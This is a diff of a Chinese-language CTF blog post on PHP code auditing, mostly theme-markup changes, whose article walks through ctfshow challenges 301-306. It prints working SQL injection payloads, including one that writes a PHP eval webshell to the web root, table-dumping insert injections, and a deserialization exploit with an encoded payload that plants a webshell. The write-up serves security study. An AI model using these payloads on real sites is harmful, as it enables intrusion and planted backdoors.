@@ -1,85 +1,264 @@
-
 <!DOCTYPE html>
-<html lang="en" class="loading">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Web_9_PHP代码审计 - Charmersix</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="首先总结一下代码审计的思路
-
-
-检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程
-找出哪些文件在接收外部传入的参数, 然后跟踪变量的传递过,"> 
-    <meta name="author" content="John Doe"> 
-    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
-    <link rel="icon" href="/img/favicon.png"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Charmersix">
     
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <title>
+        
+            Web_9_PHP代码审计 |
+        
+        Charmersix&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-    
-    
-    <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="Web_9_PHP代码审计 - Charmersix"/>
-    <meta name="twitter:description" content="首先总结一下代码审计的思路
-
-
-检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程
-找出哪些文件在接收外部传入的参数, 然后跟踪变量的传递过,"/>
-    
-    
-    
-    
-    <meta property="og:site_name" content="Charmersix"/>
-    <meta property="og:type" content="object"/>
-    <meta property="og:title" content="Web_9_PHP代码审计 - Charmersix"/>
-    <meta property="og:description" content="首先总结一下代码审计的思路
-
-
-检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程
-找出哪些文件在接收外部传入的参数, 然后跟踪变量的传递过,"/>
-    
-<link rel="stylesheet" href="/css/diaspora.css">
-
+    <link rel="shortcut icon" href="/images/head.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/head.png","avatar":"/images/ta.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://lsvf4zhg.api.lncldglobal.com","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Charmersix</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">Web_9_PHP代码审计</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
-    </div>
-    <div class="scrollbar"></div>
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">Web_9_PHP代码审计</h1>
-        <div class="stuff">
-            <span>三月 24, 2023</span>
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
             
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">PHP - 代码审计</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Study/" rel="tag">Study</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Charmersix&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/link"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/link">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
 
 
         </div>
-        <div class="content markdown">
-            <p>首先总结一下代码审计的思路</p>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Web_9_PHP代码审计</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/ta.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Charmersix</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-03-24 00:00:00</span>
+        <span class="mobile">2023-03-24 00:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-09 16:41:16</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Study/">Study</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>7.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>30 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p>首先总结一下代码审计的思路</p>
 <blockquote>
 <ol>
 <li>检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程</li>
@@ -129,7 +308,12 @@
 
 <p>比如这里, 后台评论管理的地方, 获取了评论和ID等参数, 在未经过滤的情况下, 传入了<code>CheckPl_all()</code>函数, 可见这里的参数都没有调用过滤函数进行处理, 但是好在都对这些参数使用了int类型强制类型转换; 所以比较安全</p>
 <p>然后我们开始刷一下ctfshow的题目301-310</p>
-<h3 id="做几个题"><a href="#做几个题" class="headerlink" title="做几个题"></a>做几个题</h3><h4 id="301"><a href="#301" class="headerlink" title="301"></a>301</h4><p>映入眼帘一个登陆框, 猜测存在SQL注入<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182017481.png" alt="image-20230318201723336"></p>
+<h3 id="做几个题"><a href="#做几个题" class="headerlink" title="做几个题"></a>做几个题</h3><h4 id="301"><a href="#301" class="headerlink" title="301"></a>301</h4><p>映入眼帘一个登陆框, 猜测存在SQL注入<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182017481.png"
+                      alt="image-20230318201723336"
+                ></p>
 <p>果然, 毫无过滤的一个SQL注入漏洞, 然后这里第二个<code>if</code>判断</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -139,13 +323,28 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1;#</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
 
 <p>这样我们查询的结果就是<code>1</code>, 然后密码也设为<code>1</code>即可, 当然也可以是2</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182048998.png" alt="image-20230318204821967"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182048998.png"
+                      alt="image-20230318204821967"
+                ></p>
 <p>即可登录成功, 拿到flag</p>
 <h4 id="302"><a href="#302" class="headerlink" title="302"></a>302</h4><p>这题就只是修改了一个地方而已</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182236359.png" alt="image-20230318223652309"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182236359.png"
+                      alt="image-20230318223652309"
+                ></p>
 <p>多了一个加密方法, 将用户输入的密码进行了一个解码, 那么我们人工将已经解码的<code>sds_password</code>输入进去, 那么两个变量还是相等的, 当然我们也可以将输入的<code>userowd</code>编码一下再输入进去, 但是那样是逆向的很明显要复杂很多</p>
 <p>我们按住<code>CTRL</code>鼠标左键点一下<code>sds_decode</code>函数, 就能看见解码函数<code>fun.php</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182255974.png" alt="image-20230318225522896"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182255974.png"
+                      alt="image-20230318225522896"
+                ></p>
 <p>这个脚本也就是我们的exp:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -156,35 +355,105 @@
 <p>这里直接放payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select &quot;&lt;?php eval($_POST[1]); ?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;%23&amp;userpwd=1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182305935.png" alt="image-20230318230540885"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182305935.png"
+                      alt="image-20230318230540885"
+                ></p>
 <p>然后我们直接访问<code>1.php</code>, 然后就拿到shell了</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182306190.png" alt="image-20230318230634126"></p>
-<h4 id="303"><a href="#303" class="headerlink" title="303"></a>303</h4><p>这题又增加了限制, 限制用户名长度小于6<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182336268.png" alt="image-20230318233606240"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182306190.png"
+                      alt="image-20230318230634126"
+                ></p>
+<h4 id="303"><a href="#303" class="headerlink" title="303"></a>303</h4><p>这题又增加了限制, 限制用户名长度小于6<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182336268.png"
+                      alt="image-20230318233606240"
+                ></p>
 <p>那么我们之前的方法就不适用了</p>
-<p>我们继续看下面的文件, 到了这个<code>dptadd.php</code>, 再次发现SQL语句, 是insert<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182337455.png" alt="image-20230318233757326"></p>
-<p>但是这个php文件, 我们无法直接访问, 需要登录后才可以, 这里有一个sql文件, 我们打开看一下, 发现了特别像密码的东西.<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182341184.png" alt="image-20230318234129044"></p>
-<p> 但是根据上一题经验, 这里的密码也应该是编码过的, 我们再去<code>fun.php</code>看一下, 运行刚好是那串字符串<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182343056.png" alt="image-20230318234341919"></p>
+<p>我们继续看下面的文件, 到了这个<code>dptadd.php</code>, 再次发现SQL语句, 是insert<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182337455.png"
+                      alt="image-20230318233757326"
+                ></p>
+<p>但是这个php文件, 我们无法直接访问, 需要登录后才可以, 这里有一个sql文件, 我们打开看一下, 发现了特别像密码的东西.<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182341184.png"
+                      alt="image-20230318234129044"
+                ></p>
+<p> 但是根据上一题经验, 这里的密码也应该是编码过的, 我们再去<code>fun.php</code>看一下, 运行刚好是那串字符串<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182343056.png"
+                      alt="image-20230318234341919"
+                ></p>
 <p>那么账号密码就应该是admin,admin; 当然这里爆破弱口令似乎也是可以的</p>
 <p>这里直接贴一下payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dpt_name<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dpt_name=123&#x27;</span>,sds_address<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;sds_fl9g&#x27;</span>)<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>dpt_address<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>dpt_build_year<span class="operator">=</span><span class="number">2023</span><span class="number">-03</span><span class="number">-01</span><span class="operator">&amp;</span>dpt_has_cert<span class="operator">=</span><span class="keyword">on</span><span class="operator">&amp;</span>dpt_cert_number<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>dpt_telephone_number<span class="operator">=</span><span class="number">123</span></span><br><span class="line"></span><br><span class="line">dpt_name<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;,sds_address=(select flag from sds_fl9g)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123</span></span><br></pre></td></tr></table></figure>
 
 <p>我们只需要抓一个<code>dptadd.php</code>的包</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182354844.png" alt="image-20230318235426791"></p>
-<p>最终的查询结果就可以在<code>dpt.php</code>界面显示出来<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182355714.png" alt="image-20230318235500652"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182354844.png"
+                      alt="image-20230318235426791"
+                ></p>
+<p>最终的查询结果就可以在<code>dpt.php</code>界面显示出来<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182355714.png"
+                      alt="image-20230318235500652"
+                ></p>
 <h4 id="304"><a href="#304" class="headerlink" title="304"></a>304</h4><p>增加了全局waf</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>但是好像并没有什么用,  貌似是源代码里没有用上waf, 我们继续试一下上题的payload,</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192113963.png" alt="image-20230319211342829"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192113963.png"
+                      alt="image-20230319211342829"
+                ></p>
 <p>这里只是换了个表名, 但是payload仍然适用</p>
 <h4 id="305"><a href="#305" class="headerlink" title="305"></a>305</h4><p>这里介绍一个比较好用的工具, <code>seay源码审计系统</code></p>
-<p>我们把文件夹在里边打开直接点击自动审计即可<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192151136.png" alt="image-20230319215153061"></p>
-<p>我们先看一下这个sql注入, 会发现这里套了waf, 那很明显前面的SQL注入就不能用了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192152114.png" alt="image-20230319215258043"></p>
+<p>我们把文件夹在里边打开直接点击自动审计即可<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192151136.png"
+                      alt="image-20230319215153061"
+                ></p>
+<p>我们先看一下这个sql注入, 会发现这里套了waf, 那很明显前面的SQL注入就不能用了<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192152114.png"
+                      alt="image-20230319215258043"
+                ></p>
 <p>那么我们尝试利用一下这个反序列化漏洞</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192159449.png" alt="image-20230319215952311"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192159449.png"
+                      alt="image-20230319215952311"
+                ></p>
 <p>这里有个<code>file_put_contents</code>, 那么反序列化入口点在哪呢, 我们可以搜一下<code>user</code>试试</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192202888.png" alt="image-20230319220233850"></p>
-<p>可以看出<code>cookie </code>是反序列化入口, 我们先构造一个一句话木马试一试<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192203294.png" alt="image-20230319220302158"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192202888.png"
+                      alt="image-20230319220233850"
+                ></p>
+<p>可以看出<code>cookie </code>是反序列化入口, 我们先构造一个一句话木马试一试<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192203294.png"
+                      alt="image-20230319220302158"
+                ></p>
 <p>exp:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -192,57 +461,177 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>user%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
 
 <p>这里还是需要我们登录后才能利用的, 所以我们要首先利用弱口令登录, 然后访问<code>checklogin.php</code>通过<code>cookie</code>发包</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212033829.png" alt="image-20230321203258701"></p>
-<p>连蚁剑并没有发现flag, 但是存在数据库, 我们猜测flag在数据库里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212036142.png" alt="image-20230321203600089"></p>
-<h4 id="306"><a href="#306" class="headerlink" title="306"></a>306</h4><p>扫一下, 又在<code>class.php</code>里发现了漏洞<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212246566.png" alt="image-20230321224658471"></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212252416.png" alt="image-20230321225242370"></p>
-<p>然后我们再找一下<code>close()</code>, 然后在<code>dao.php</code>中找到了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212255531.png" alt="image-20230321225507395"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212033829.png"
+                      alt="image-20230321203258701"
+                ></p>
+<p>连蚁剑并没有发现flag, 但是存在数据库, 我们猜测flag在数据库里<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212036142.png"
+                      alt="image-20230321203600089"
+                ></p>
+<h4 id="306"><a href="#306" class="headerlink" title="306"></a>306</h4><p>扫一下, 又在<code>class.php</code>里发现了漏洞<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212246566.png"
+                      alt="image-20230321224658471"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212252416.png"
+                      alt="image-20230321225242370"
+                ></p>
+<p>然后我们再找一下<code>close()</code>, 然后在<code>dao.php</code>中找到了<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212255531.png"
+                      alt="image-20230321225507395"
+                ></p>
 <p>我们构造一下exp.php</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221525686.png" alt="image-20230322152532491"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221525686.png"
+                      alt="image-20230322152532491"
+                ></p>
